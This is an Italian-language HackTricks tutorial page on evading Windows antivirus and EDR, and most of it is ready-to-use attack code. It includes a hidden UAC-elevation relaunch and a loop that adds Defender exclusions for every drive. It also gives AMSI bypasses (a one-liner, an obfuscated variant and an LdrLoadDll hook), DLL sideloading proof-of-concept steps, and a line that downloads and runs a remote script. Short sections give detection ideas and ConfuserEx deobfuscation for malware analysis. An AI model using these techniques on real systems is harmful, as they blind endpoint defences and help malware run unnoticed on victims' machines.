# Bypass dell'Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Questa pagina è stata scritta inizialmente da** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Arrestare Defender

- [defendnot](https://github.com/es3n1n/defendnot): Uno strumento per impedire il funzionamento di Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Uno strumento per impedire il funzionamento di Windows Defender simulando un altro AV.
- [Disabilitare Defender se si è admin](basic-powershell-for-pentesters/README.md)

### Esca UAC in stile installer prima di manomettere Defender

I loader pubblici che si spacciano per cheat di giochi vengono spesso distribuiti come installer Node.js/Nexe non firmati che prima **chiedono all'utente l'elevazione dei privilegi** e solo in seguito neutralizzano Defender. Il flusso è semplice:

1. Verificare il contesto amministrativo con `net session`. Il comando ha esito positivo solo quando il chiamante dispone dei diritti di amministratore, quindi un errore indica che il loader è in esecuzione come utente standard.
2. Riavviarsi immediatamente con il verbo `RunAs` per attivare il previsto prompt di consenso UAC, preservando al contempo la riga di comando originale.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Le vittime credono già di installare software “craccato”, quindi il prompt viene solitamente accettato, fornendo al malware i diritti necessari per modificare i criteri di Defender.<sup>[[26]](#references)</sup>

### Esclusioni `MpPreference` generali per ogni lettera di unità

Una volta ottenuti i privilegi elevati, le catene in stile GachiLoader massimizzano i punti ciechi di Defender invece di disabilitare direttamente il servizio. Il loader prima termina il watchdog della GUI (`taskkill /F /IM SecHealthUI.exe`) e poi applica **esclusioni estremamente ampie**, in modo che ogni profilo utente, directory di sistema e disco rimovibile diventi non analizzabile:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Osservazioni principali:

- Il ciclo analizza ogni filesystem montato (D:\, E:\, chiavette USB, ecc.), quindi **qualsiasi payload futuro depositato ovunque sul disco viene ignorato**.
- L'esclusione dell'estensione `.sys` è lungimirante: gli attacker mantengono la possibilità di caricare in seguito driver non firmati senza modificare nuovamente Defender.
- Tutte le modifiche vengono applicate sotto `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, consentendo alle fasi successive di confermare che le esclusioni persistano o di ampliarle senza riattivare UAC.

Poiché nessun servizio di Defender viene arrestato, i semplici controlli dello stato continuano a segnalare “antivirus attivo”, anche se l'ispezione in tempo reale non analizza mai quei percorsi.<sup>[[26]](#references)</sup>

## **Metodologia di evasione degli AV**

Attualmente, gli AV utilizzano metodi diversi per verificare se un file è malicious o meno: rilevamento statico, analisi dinamica e, per gli EDR più avanzati, analisi comportamentale.

### **Rilevamento statico**

Il rilevamento statico viene ottenuto segnalando stringhe o array di byte noti come malicious all'interno di un binario o di uno script, oltre a estrarre informazioni dal file stesso (ad esempio descrizione del file, nome dell'azienda, firme digitali, icona, checksum, ecc.). Ciò significa che l'utilizzo di tool pubblici conosciuti può farti rilevare più facilmente, poiché probabilmente sono già stati analizzati e contrassegnati come malicious. Esistono alcuni modi per aggirare questo tipo di rilevamento:

- **Encryption**

Se esegui l'encryption del binario, l'AV non avrà modo di rilevare il tuo programma, ma avrai bisogno di un qualche tipo di loader per eseguire la decryption e avviare il programma in memoria.

- **Obfuscation**

A volte è sufficiente modificare alcune stringhe nel binario o nello script per superare il controllo dell'AV, ma può essere un'attività lunga a seconda di ciò che stai cercando di offuscare.

- **Custom tooling**

Se sviluppi i tuoi tool, non saranno presenti signature note come bad, ma ciò richiede molto tempo e impegno.

> [!TIP]
> Un buon metodo per verificare il rilevamento statico di Windows Defender è [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). In pratica, divide il file in più segmenti e chiede a Defender di analizzarli singolarmente; in questo modo può dirti esattamente quali stringhe o byte del tuo binario sono stati segnalati.

Ti consiglio vivamente di consultare questa [playlist di YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sull'AV Evasion pratica.

### **Analisi dinamica**

L'analisi dinamica si verifica quando l'AV esegue il tuo binario in una sandbox e osserva le attività malicious (ad esempio, tentare di effettuare la decryption e leggere le password del browser, eseguire un minidump su LSASS, ecc.). Questa parte può essere un po' più difficile da gestire, ma puoi adottare alcune misure per effettuare l'evasion dalle sandbox.

- **Sleep prima dell'esecuzione** A seconda di come viene implementato, può essere un ottimo modo per bypassare l'analisi dinamica dell'AV. Gli AV hanno pochissimo tempo per analizzare i file senza interrompere il flusso di lavoro dell'utente, quindi l'utilizzo di sleep prolungati può disturbare l'analisi dei binari. Il problema è che molte sandbox degli AV possono semplicemente saltare lo sleep, a seconda di come è stato implementato.
- **Controllo delle risorse della macchina** Di solito le sandbox dispongono di risorse molto limitate (ad esempio < 2GB di RAM), altrimenti potrebbero rallentare la macchina dell'utente. Anche in questo caso puoi essere molto creativo, ad esempio controllando la temperatura della CPU o persino la velocità delle ventole: non tutto sarà implementato nella sandbox.
- **Controlli specifici della macchina** Se vuoi colpire un utente la cui workstation è aggiunta al dominio "contoso.local", puoi controllare il dominio del computer per verificare se corrisponde a quello specificato; in caso contrario, puoi far terminare il programma.

È emerso che il computername della Sandbox di Microsoft Defender è HAL9TH; puoi quindi controllare il nome del computer nel tuo malware prima della detonation. Se il nome corrisponde a HAL9TH, significa che ti trovi nella sandbox di Defender, quindi puoi far terminare il programma.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>fonte: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Altri ottimi consigli di [@mgeeky](https://twitter.com/mariuszbit) per contrastare le sandbox

<figure><img src="../images/image (248).png" alt=""><figcaption><p>canale <a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev</p></figcaption></figure>

Come abbiamo già detto in precedenza in questo post, i **tool pubblici** alla fine **verranno rilevati**, quindi dovresti porti una domanda:

Ad esempio, se vuoi effettuare il dump di LSASS, **hai davvero bisogno di usare mimikatz**? Oppure potresti usare un progetto diverso, meno conosciuto, che esegua anch'esso il dump di LSASS?

La risposta corretta probabilmente è la seconda. Prendendo mimikatz come esempio, è probabilmente uno dei malware più segnalati dagli AV e dagli EDR, se non il più segnalato; anche se il progetto in sé è molto valido, è anche un incubo da gestire per aggirare gli AV. Cerca quindi alternative per ottenere ciò che stai cercando di realizzare.

> [!TIP]
> Quando modifichi i tuoi payload per l'evasion, assicurati di **disattivare l'invio automatico dei sample** in Defender e, per favore, seriamente, **NON CARICARE SU VIRUSTOTAL** se il tuo obiettivo è ottenere l'evasion a lungo termine. Se vuoi verificare se il tuo payload viene rilevato da uno specifico AV, installalo su una VM, prova a disattivare l'invio automatico dei sample e testalo lì finché non sei soddisfatto del risultato.

## EXEs vs DLLs

Quando possibile, **dai sempre priorità all'uso delle DLL per l'evasion**; nella mia esperienza, i file DLL vengono generalmente **rilevati e analizzati molto meno**, quindi in alcuni casi è un trucco molto semplice per evitare il rilevamento (a condizione, naturalmente, che il tuo payload possa essere eseguito come DLL).

Come possiamo vedere in questa immagine, un DLL Payload di Havoc ha un detection rate di 4/26 su antiscan.me, mentre il payload EXE ha un detection rate di 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>confronto su antiscan.me tra un payload EXE Havoc normale e una DLL Havoc normale</p></figcaption></figure>

Ora mostreremo alcuni trucchi che puoi usare con i file DLL per ottenere una maggiore stealth.

## DLL Sideloading & Proxying

**DLL Sideloading** sfrutta l'ordine di ricerca delle DLL utilizzato dal loader, posizionando l'applicazione vittima e i payload malicious uno accanto all'altro.

Puoi verificare quali programmi sono vulnerabili al DLL Sideloading usando [Siofra](https://github.com/Cybereason/siofra) e il seguente script powershell:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Questo comando restituirà l’elenco dei programmi soggetti a DLL hijacking all’interno di "C:\Program Files\\" e dei file DLL che tentano di caricare.

Ti consiglio vivamente di **esplorare personalmente i programmi DLL Hijackable/Sideloadable**; questa tecnica, se eseguita correttamente, è piuttosto stealth, ma se utilizzi programmi DLL Sideloadable noti pubblicamente, potresti essere individuato facilmente.

Il semplice posizionamento di una DLL malevola con il nome che un programma si aspetta di caricare non caricherà il tuo payload, poiché il programma si aspetta alcune funzioni specifiche all’interno di quella DLL. Per risolvere questo problema, useremo un’altra tecnica chiamata **DLL Proxying/Forwarding**.

**DLL Proxying** inoltra le chiamate effettuate da un programma dalla DLL proxy (e malevola) alla DLL originale, preservando così le funzionalità del programma e consentendo di gestire l’esecuzione del tuo payload.

Utilizzerò il progetto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) di [@flangvik](https://twitter.com/Flangvik/)

Questi sono i passaggi che ho seguito:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
L'ultimo comando ci fornirà 2 file: un template di codice sorgente DLL e la DLL originale rinominata.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Questi sono i risultati:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sia il nostro shellcode (codificato con [SGN](https://github.com/EgeBalci/sgn)) sia la proxy DLL hanno un Detection rate pari a 0/26 su [antiscan.me](https://antiscan.me)! Direi che è un successo.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ti **consiglio vivamente** di guardare il [VOD su Twitch di S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) sul DLL Sideloading e anche il [video di ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) per saperne di più su ciò che abbiamo discusso in modo più approfondito.

### Abuso delle Export inoltrate (ForwardSideLoading)

I moduli PE di Windows possono esportare funzioni che sono in realtà dei "forwarder": invece di puntare al codice, l'entry dell'export contiene una stringa ASCII nel formato `TargetDll.TargetFunc`. Quando un chiamante risolve l'export, il loader di Windows:

- Carica `TargetDll` se non è già stato caricato
- Risolve `TargetFunc` al suo interno

Comportamenti fondamentali da comprendere:
- Se `TargetDll` è una KnownDLL, viene fornita dal namespace protetto KnownDLLs (ad esempio ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Se `TargetDll` non è una KnownDLL, viene utilizzato il normale ordine di ricerca delle DLL, che include la directory del modulo che sta eseguendo la forward resolution.

Questo abilita una primitiva di sideloading indiretta: individuare una DLL firmata che esporta una funzione inoltrata a un nome di modulo non-KnownDLL, quindi collocare quella DLL firmata insieme a una DLL controllata dall'attacker denominata esattamente come il modulo target inoltrato. Quando l'export inoltrato viene invocato, il loader risolve il forward e carica la tua DLL dalla stessa directory, eseguendo il tuo DllMain.<sup>[[13]](#references)</sup>

Esempio osservato su Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` non è una KnownDLL, quindi viene risolta tramite il normale ordine di ricerca.

PoC (copia-incolla):
1) Copia la DLL di sistema firmata in una cartella scrivibile
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Inserisci una `NCRYPTPROV.dll` dannosa nella stessa cartella. È sufficiente un `DllMain` minimale per ottenere l'esecuzione del codice; non è necessario implementare la funzione inoltrata per attivare `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Attiva il forward con un LOLBin firmato:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Comportamento osservato:
- rundll32 (firmato) carica il `keyiso.dll` side-by-side (firmato)
- Durante la risoluzione di `KeyIsoSetAuditingInterface`, il loader segue il forward verso `NCRYPTPROV.SetAuditingInterface`
- Il loader carica quindi `NCRYPTPROV.dll` da `C:\test` ed esegue il suo `DllMain`
- Se `SetAuditingInterface` non è implementata, riceverai un errore "missing API" solo dopo che `DllMain` è già stato eseguito

Suggerimenti per la ricerca:
- Concentrati sugli export inoltrati in cui il modulo di destinazione non è una KnownDLL. Le KnownDLLs sono elencate in `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Puoi enumerare gli export inoltrati con strumenti come:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Consulta l’inventario dei forwarder di Windows 11 per cercare candidati: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Idee per il rilevamento/la difesa:
- Monitora i LOLBins (ad es., rundll32.exe) che caricano DLL firmate da percorsi non di sistema, seguiti dal caricamento di KnownDLLs non presenti nella directory, con lo stesso nome di base
- Genera un alert per catene di processi/moduli come: `rundll32.exe` → `keyiso.dll` non di sistema → `NCRYPTPROV.dll` in percorsi scrivibili dall’utente
- Applica policy di code integrity (WDAC/AppLocker) e nega i permessi di scrittura+esecuzione nelle directory delle applicazioni

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze è un payload toolkit per bypassare gli EDR usando processi sospesi, direct syscalls e metodi di esecuzione alternativi`

Puoi usare Freeze per caricare ed eseguire il tuo shellcode in modo stealth.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> L'evasione è solo un gioco del gatto e del topo: ciò che funziona oggi potrebbe essere rilevato domani, quindi non fare mai affidamento su un solo tool; se possibile, prova a concatenare più tecniche di evasione.

## Syscall dirette/indirette e risoluzione degli SSN (SysWhispers4)

Gli EDR spesso posizionano **inline hook in user-mode** sugli stub delle syscall di `ntdll.dll`. Per bypassare questi hook, puoi generare stub di syscall **dirette** o **indirette** che caricano l'**SSN** corretto (System Service Number) ed effettuano la transizione alla kernel mode senza eseguire l'entrypoint dell'export sottoposto a hook.<sup>[[32]](#references)</sup>

**Opzioni di invocazione:**
- **Direct (embedded)**: emette un'istruzione `syscall`/`sysenter`/`SVC #0` nello stub generato (senza raggiungere l'export di `ntdll`).
- **Indirect**: esegue un jump verso un gadget `syscall` esistente all'interno di `ntdll`, così la transizione al kernel appare originare da `ntdll` (utile per l'evasione euristica); **randomized indirect** seleziona un gadget da un pool a ogni chiamata.
- **Egg-hunt**: evita di incorporare su disco la sequenza opcode statica `0F 05`; risolve una sequenza syscall a runtime.

**Strategie di risoluzione degli SSN resistenti agli hook:**
- **FreshyCalls (VA sort)**: deduce gli SSN ordinando gli stub delle syscall in base all'indirizzo virtuale invece di leggere i byte degli stub.
- **SyscallsFromDisk**: mappa una `\KnownDlls\ntdll.dll` pulita, legge gli SSN dalla sua sezione `.text`, quindi esegue l'unmap (bypassando tutti gli hook in memoria).
- **RecycledGate**: combina la deduzione degli SSN tramite ordinamento VA con la validazione degli opcode quando uno stub è pulito; se è sottoposto a hook, ricorre alla deduzione tramite VA.
- **HW Breakpoint**: imposta DR0 sull'istruzione `syscall` e utilizza un VEH per acquisire l'SSN da `EAX` a runtime, senza analizzare i byte sottoposti a hook.

Esempio di utilizzo di SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI è stato creato per impedire il "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Inizialmente, gli AV erano in grado di analizzare solo i **file sul disco**, quindi, se si riusciva in qualche modo a eseguire i payload **direttamente in memoria**, l'AV non poteva fare nulla per impedirlo, poiché non disponeva di una visibilità sufficiente.

La funzionalità AMSI è integrata nei seguenti componenti di Windows.

- User Account Control, o UAC (elevazione di EXE, COM, MSI o installazione di ActiveX)
- PowerShell (script, utilizzo interattivo e valutazione dinamica del codice)
- Windows Script Host (wscript.exe e cscript.exe)
- JavaScript e VBScript
- Macro VBA di Office

Consente alle soluzioni antivirus di ispezionare il comportamento degli script esponendone i contenuti in una forma non crittografata e non offuscata.

L'esecuzione di `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` produrrà il seguente alert in Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Si noti come anteponga `amsi:` e poi il percorso dell'eseguibile dal quale è stato eseguito lo script, in questo caso powershell.exe

Non abbiamo scritto alcun file sul disco, ma siamo comunque stati rilevati in-memory a causa di AMSI.

Inoltre, a partire da **.NET 4.8**, anche il codice C# viene eseguito tramite AMSI. Questo riguarda persino `Assembly.Load(byte[])` per caricare un'esecuzione in-memory. Per questo motivo, per l'esecuzione in-memory è consigliato utilizzare versioni inferiori di .NET (come la 4.7.2 o precedenti) se si vuole eludere AMSI.

Esistono un paio di modi per aggirare AMSI:

- **Obfuscation**

Poiché AMSI funziona principalmente con rilevamenti statici, modificare gli script che si tenta di caricare può essere un buon modo per eludere il rilevamento.

Tuttavia, AMSI è in grado di deoffuscare gli script anche se presentano più livelli, quindi l'obfuscation potrebbe essere una scelta svantaggiosa a seconda di come viene eseguita. Questo rende l'elusione tutt'altro che semplice. A volte, però, è sufficiente modificare un paio di nomi di variabili per ottenere il risultato desiderato, quindi dipende da quanto qualcosa è stato segnalato.

- **AMSI Bypass**

Poiché AMSI viene implementato caricando una DLL nel processo di powershell (oltre a cscript.exe, wscript.exe, ecc.), è possibile manometterlo facilmente anche eseguendo il codice come utente senza privilegi. A causa di questo difetto nell'implementazione di AMSI, i ricercatori hanno trovato diversi modi per eludere la scansione di AMSI.

**Forzare un errore**

Forzare il fallimento dell'inizializzazione di AMSI (amsiInitFailed) farà sì che non venga avviata alcuna scansione per il processo corrente. Questa tecnica è stata divulgata originariamente da [Matt Graeber](https://twitter.com/mattifestation), e Microsoft ha sviluppato una signature per impedirne un utilizzo più ampio.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
È bastata una sola riga di codice powershell per rendere AMSI inutilizzabile per il processo powershell corrente. Naturalmente, questa riga è stata rilevata da AMSI stesso, quindi è necessaria qualche modifica per poter utilizzare questa tecnica.

Ecco un AMSI bypass modificato che ho preso da questo [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Tieni presente che probabilmente questo verrà segnalato una volta pubblicato il post, quindi non dovresti pubblicare alcun codice se il tuo piano è rimanere undetected.

**Memory Patching**

Questa tecnica è stata scoperta inizialmente da [@RastaMouse](https://twitter.com/_RastaMouse/) e consiste nell'individuare l'indirizzo della funzione "AmsiScanBuffer" in amsi.dll (responsabile della scansione dell'input fornito dall'utente) e sovrascriverlo con istruzioni che restituiscano il codice per E_INVALIDARG; in questo modo, il risultato della scansione effettiva sarà 0, che viene interpretato come un risultato pulito.

> [!TIP]
> Leggi [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) per una spiegazione più dettagliata.

Esistono anche molte altre tecniche utilizzate per bypassare AMSI con powershell; consulta [**questa pagina**](basic-powershell-for-pentesters/index.html#amsi-bypass) e [**questo repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) per saperne di più.

### Blocco di AMSI impedendo il caricamento di amsi.dll (hook LdrLoadDll)

AMSI viene inizializzato solo dopo che `amsi.dll` è stato caricato nel processo corrente. Un bypass robusto e indipendente dal linguaggio consiste nell'installare un hook in user-mode su `ntdll!LdrLoadDll` che restituisca un errore quando il modulo richiesto è `amsi.dll`. Di conseguenza, AMSI non viene mai caricato e non vengono eseguite scansioni per quel processo.<sup>[[23]](#references)</sup>

Schema dell'implementazione (pseudocodice C/C++ x64):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Note
- Funziona con PowerShell, WScript/CScript e custom loader allo stesso modo (qualsiasi cosa che altrimenti caricherebbe AMSI).
- Abbinalo all'invio degli script tramite stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) per evitare artefatti nella riga di comando troppo lunghi.
- È stato osservato l'utilizzo da parte di loader eseguiti tramite LOLBins (ad esempio, `regsvr32` che richiama `DllRegisterServer`).

Anche il tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** genera script per bypassare AMSI.
Anche il tool **[https://amsibypass.com/](https://amsibypass.com/)** genera script per bypassare AMSI che evitano il rilevamento tramite signature usando funzioni definite dall'utente, variabili ed espressioni di caratteri randomizzate, applicando inoltre una capitalizzazione casuale dei caratteri nelle keyword di PowerShell per evitare il rilevamento tramite signature.

**Rimuovere la signature rilevata**

Puoi usare un tool come **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** e **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** per rimuovere la signature AMSI rilevata dalla memoria del processo corrente. Questo tool funziona analizzando la memoria del processo corrente alla ricerca della signature AMSI e sovrascrivendola quindi con istruzioni NOP, rimuovendola di fatto dalla memoria.

**Prodotti AV/EDR che usano AMSI**

Puoi trovare un elenco dei prodotti AV/EDR che usano AMSI in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Usare PowerShell versione 2**
Se usi PowerShell versione 2, AMSI non verrà caricato, quindi puoi eseguire i tuoi script senza che vengano analizzati da AMSI. Puoi fare quanto segue:
```bash
powershell.exe -version 2
```
## Logging di PowerShell

Il logging di PowerShell è una funzionalità che consente di registrare tutti i comandi PowerShell eseguiti su un sistema. Può essere utile per scopi di auditing e troubleshooting, ma può anche rappresentare un **problema per gli attaccanti che vogliono eludere il rilevamento**.

Per bypassare il logging di PowerShell, puoi usare le seguenti tecniche:

- **Disabilitare PowerShell Transcription e Module Logging**: a questo scopo puoi usare uno strumento come [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Usare Powershell versione 2**: se usi PowerShell versione 2, AMSI non verrà caricato, quindi potrai eseguire gli script senza che vengano analizzati da AMSI. Puoi farlo con: `powershell.exe -version 2`
- **Usare una sessione PowerShell unmanaged**: usa [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) per ospitare PowerShell senza avviare `powershell.exe` (l'approccio usato da `powerpick` di Cobalt Strike). Questo elude i controlli legati specificamente al processo `powershell.exe`, ma non disabilita intrinsecamente AMSI, Script Block Logging o ogni altra difesa di PowerShell; la copertura dipende dal runtime e dall'implementazione dell'host.


## Offuscamento

> [!TIP]
> Diverse tecniche di offuscamento si basano sulla cifratura dei dati, aumentando l'entropia del binary e rendendone più facile il rilevamento da parte degli AV e degli EDR. Presta attenzione a questo aspetto e valuta di applicare la cifratura solo a sezioni specifiche del tuo codice che contengono dati sensibili o devono essere nascoste.

### Deoffuscare Binary .NET Protetti da ConfuserEx

Quando si analizza malware che usa ConfuserEx 2 (o fork commerciali), è comune affrontare diversi livelli di protezione che bloccano decompiler e sandbox. Il workflow seguente **ripristina un IL quasi originale** che può essere successivamente decompilato in C# con strumenti come dnSpy o ILSpy.<sup>[[10]](#references)</sup>

1.  Rimozione dell'anti-tampering – ConfuserEx cripta ogni *method body* e lo decripta all'interno del costruttore statico del *module* (`<Module>.cctor`). Inoltre modifica il checksum PE, quindi qualsiasi modifica causerà il crash del binary. Usa **AntiTamperKiller** per individuare le tabelle dei metadati criptate, recuperare le chiavi XOR e riscrivere un assembly pulito:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
L'output contiene i 6 parametri anti-tamper (`key0-key3`, `nameHash`, `internKey`) che possono essere utili per creare un tuo unpacker.

2.  Recupero dei simboli / control-flow – passa il file *clean* a **de4dot-cex** (un fork di de4dot compatibile con ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flag:
• `-p crx` – seleziona il profilo ConfuserEx 2
• de4dot annullerà il control-flow flattening, ripristinerà i namespace, le classi e i nomi originali delle variabili e decripterà le stringhe costanti.

3.  Rimozione delle proxy-call – ConfuserEx sostituisce le chiamate dirette ai metodi con wrapper leggeri (noti anche come *proxy calls*) per compromettere ulteriormente la decompilazione. Rimuovili con **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Dopo questo passaggio dovresti osservare normali API .NET come `Convert.FromBase64String` o `AES.Create()` invece di funzioni wrapper opache (`Class8.smethod_10`, …).

4.  Pulizia manuale – esegui il binary risultante con dnSpy, cerca grandi blob Base64 o l'uso di `RijndaelManaged`/`TripleDESCryptoServiceProvider` per individuare il payload *reale*. Spesso il malware lo memorizza come un byte array codificato in TLV inizializzato all'interno di `<Module>.byte_0`.

La catena descritta ripristina il flusso di esecuzione **senza dover eseguire il sample malevolo**, risultando utile quando si lavora su una workstation offline.

> 🛈  ConfuserEx produce un attributo custom denominato `ConfusedByAttribute`, che può essere usato come IOC per eseguire automaticamente il triage dei sample.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: offuscatore C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): l'obiettivo di questo progetto è fornire un fork open-source della suite di compilazione [LLVM](http://www.llvm.org/) in grado di offrire una maggiore sicurezza del software tramite [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) e protezione contro le manomissioni.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator dimostra come utilizzare il linguaggio `C++11/14` per generare, in fase di compilazione, codice offuscato senza usare strumenti esterni e senza modificare il compilatore.
- [**obfy**](https://github.com/fritzone/obfy): aggiunge un livello di operazioni offuscate generate dal framework di metaprogrammazione dei template C++, rendendo leggermente più difficile il lavoro di chi vuole crackare l'applicazione.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz è un binary obfuscator x64 in grado di offuscare diversi PE, tra cui: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame è un semplice motore di codice metamorphic per eseguibili arbitrari.
